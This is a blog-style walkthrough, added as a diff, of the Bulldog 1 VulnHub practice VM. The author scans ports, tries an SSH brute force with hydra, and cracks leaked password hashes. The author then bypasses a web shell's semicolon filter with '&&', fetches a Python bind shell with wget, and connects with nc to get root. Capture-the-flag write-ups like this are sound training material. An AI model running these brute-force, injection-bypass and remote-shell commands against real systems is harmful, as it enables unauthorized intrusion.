@@ -1,0 +1,153 @@
+Bulldog Boot2Root VM Walkthrough
+---------
+
+Decided to have another stab at a machine from vuln hub, this time it was [Bulldog 1](https://www.vulnhub.com/entry/bulldog-1,211/)
+
+https://www.vulnhub.com/entry/bulldog-1,211/
+
+robots.txt has hacked message
+
+Lets port scan the machine
+
+	nmap: Nmap scan report for 172.16.10.83
+	Host is up (0.013s latency).
+	Not shown: 997 closed ports
+	PORT     STATE SERVICE VERSION
+	23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)
+	|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)
+	|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (EdDSA)
+	80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
+	|_http-server-header: WSGIServer/0.1 Python/2.7.12
+	|_http-title: Bulldog Industries
+	8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
+	|_http-title: Bulldog Industries
+	Device type: general purpose
+	Running: Linux 3.X|4.X
+	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+	OS details: Linux 3.10 - 4.8
+	Network Distance: 2 hops
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Port 8080 seems to be running the same as port 80, lets ignore that for now. Time to run dirb against it to see if there is anything
+
+It looks like /dev/ has some content, full of potential users 
+
+	Team Lead: alan@bulldogindustries.com
+	Back-up Team Lead: william@bulldogindustries.com
+
+	Front End: malik@bulldogindustries.com
+	Front End: kevin@bulldogindustries.com
+
+	Back End: ashley@bulldogindustries.com
+	Back End: nick@bulldogindustries.com
+
+	Database: sarah@bulldogindustries.com
+
+lets try ssh brute force using the top 250 passwords from the infamous rockyou.txt, using hydra
+
+`hydra -v -V -I -t 4 -L USERS -P rockyoutop250.txt ssh://172.16.10.83:23`
+
+Whilst waiting for hydra to run, I was poking around in the html and it turns out...
+
+	<!--Need these password hashes for testing. Django's default is too complex-->
+	<!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->
+	Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->
+	Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->
+	Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->
+	Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->
+	Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0-->
+	Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->
+	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->
+
+As with any hash, I always google for them first, because if someone else has reversed a hash, why would I waste my own time?
+The first few only have results for write ups of this vm, so lets ignore those
+
+However Nick gives us <https://sha1.gromweb.com/?hash=ddf45997a7e18a25ad5f5cf222da64814dd060d5> which tells us the password is an impressive "bulldog", I also find Sarah's password via <http://crackhash.com/>, "bulldoglover"
+
+Hydra is taking forever, withouth any success, so lets just ssh in with the details we already have:
+
+	ssh -p 23 nick@172.16.10.83
+
+Which doesn't work, however, what about the django admin interface? We CAN log into that, but there is nothing to do, but after this, it seems we can access the webshell which appears to be the same for both users, we can only run against a whitelist of commands, however:
+
+	cat bulldog/*.py to see some source
+
+	def validate(command):
+	    if any(com in command for com in commands) and ";" not in command:
+		return True
+	    return False
+
+so if there is a valid command and no ';', so what about using && to get around filter? Yes!  we have some shell access
+
+	Command : pwd && uname -a
+
+	/home/django/bulldog
+	Linux bulldog 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+The machine already had `nc` on there, but for some reason I couldn't get it to work with the version I was running locally, so lets do something with python to give me a shell instead!
+
+	wget https://raw.githubusercontent.com/infodox/python-pty-shells/master/tcp_pty_bind.py
+
+and then on my end:
+
+	nc 172.16.10.83 31337
+	To run a command as administrator (user "root"), use "sudo <command>".
+	See "man sudo_root" for details.
+
+	bash: /root/.bashrc: Permission denied
+
+![IM IN](/img/im-in.jpg)
+
+looks like I can read /home/bulldogadmin
+
+	django@bulldog:/home/bulldogadmin$ ls -alh
+	total 40K
+	drwxr-xr-x 5 bulldogadmin bulldogadmin 4.0K Sep 21 00:45 .
+	drwxr-xr-x 4 root         root         4.0K Aug 24 23:16 ..
+	-rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24 22:39 .bash_logout
+	-rw-r--r-- 1 bulldogadmin bulldogadmin 3.7K Aug 24 22:39 .bashrc
+	drwx------ 2 bulldogadmin bulldogadmin 4.0K Aug 24 22:40 .cache
+	drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Sep 21 00:44 .hiddenadmindirectory
+	drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Aug 25 03:18 .nano
+	-rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24 22:39 .profile
+	-rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 25 03:18 .selected_editor
+	-rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24 22:45 .sudo_as_admin_successful
+	-rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24 23:20 .wget-hsts
+
+	django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ cat note
+	Nick,
+
+	I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! 
+
+	It's great stuff! Once I'm finished with it, a hacker wouldn't even be able to reverse it! Keep in mind that it's still a prototype right now. I am about to get it working with the Django user account. I'm not sure how I'll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?
+
+	Let me know what you think of it!
+
+	-Ashley
+
+	django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ file customPermissionApp
+	customPermissionApp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c9f2333253302d74eff3da59653f82d28f9eb36f, not stripped
+
+How about running strings against it?
+
+	django@bulldog:/home/django$ strings customPermissionApp
+	...
+	SUPERultH
+	imatePASH
+	SWORDyouH
+	CANTget
+	...
+
+SUPERultimatePASSWORDyouCANTget ?
+
+Well, that was....easy
+
+	root@bulldog:~# cat congrats.txt
+	Congratulations on completing this VM :D That wasn't so bad was it?
+	Let me know what you thought on twitter, I'm @frichette_n
+	As far as I know there are two ways to get root. Can you find the other one?
+	Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
+
+TAGS:infosec
